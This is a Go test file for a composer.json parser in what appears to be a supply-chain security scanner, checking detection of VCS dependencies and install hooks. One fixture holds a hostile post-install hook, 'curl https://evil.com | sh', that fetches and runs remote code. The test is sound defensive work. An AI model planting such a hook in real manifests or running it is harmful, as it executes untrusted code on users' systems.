package heuristics

import (
	"testing"

	"github.com/qwexvf/aegis-cli/internal/domain"
)

func TestComposerParser(t *testing.T) {
	t.Run("vcs repository becomes VCS dep", func(t *testing.T) {
		manifest := []byte(`{
  "name": "example/app",
  "repositories": [
    {"type": "vcs", "url": "https://github.com/attacker/evil-package"}
  ],
  "require": {"attacker/evil-package": "dev-main"}
}`)
		p := &composerParser{}
		pkg := p.Parse("example/app", nil, domain.PackageSource{
			Files: map[string][]byte{"composer.json": manifest},
		})
		if len(pkg.Deps) == 0 {
			t.Fatal("want VCS dep, got none")
		}
		if pkg.Deps[0].Source != DepSourceVCS {
			t.Errorf("source: got %v want DepSourceVCS", pkg.Deps[0].Source)
		}
	})

	t.Run("post-install-cmd string hook", func(t *testing.T) {
		manifest := []byte(`{
  "name": "example/app",
  "scripts": {
    "post-install-cmd": "curl https://evil.com | sh"
  }
}`)
		p := &composerParser{}
		pkg := p.Parse("example/app", nil, domain.PackageSource{
			Files: map[string][]byte{"composer.json": manifest},
		})
		if len(pkg.Hooks) == 0 {
			t.Fatal("want hook, got none")
		}
		if pkg.Hooks[0].Body != "curl https://evil.com | sh" {
			t.Errorf("body: got %q", pkg.Hooks[0].Body)
		}
	})

	t.Run("post-install-cmd array hook", func(t *testing.T) {
		manifest := []byte(`{
  "name": "example/app",
  "scripts": {
    "post-install-cmd": ["php artisan migrate", "php artisan key:generate"]
  }
}`)
		p := &composerParser{}
		pkg := p.Parse("example/app", nil, domain.PackageSource{
			Files: map[string][]byte{"composer.json": manifest},
		})
		if len(pkg.Hooks) == 0 {
			t.Fatal("want hook, got none")
		}
	})

	t.Run("clean composer.json no signal", func(t *testing.T) {
		manifest := []byte(`{"name":"example/lib","require":{"php":">=8.1"}}`)
		p := &composerParser{}
		pkg := p.Parse("example/lib", nil, domain.PackageSource{
			Files: map[string][]byte{"composer.json": manifest},
		})
		if len(pkg.Deps) != 0 || len(pkg.Hooks) != 0 {
			t.Errorf("unexpected signal: deps=%v hooks=%v", pkg.Deps, pkg.Hooks)
		}
	})
}
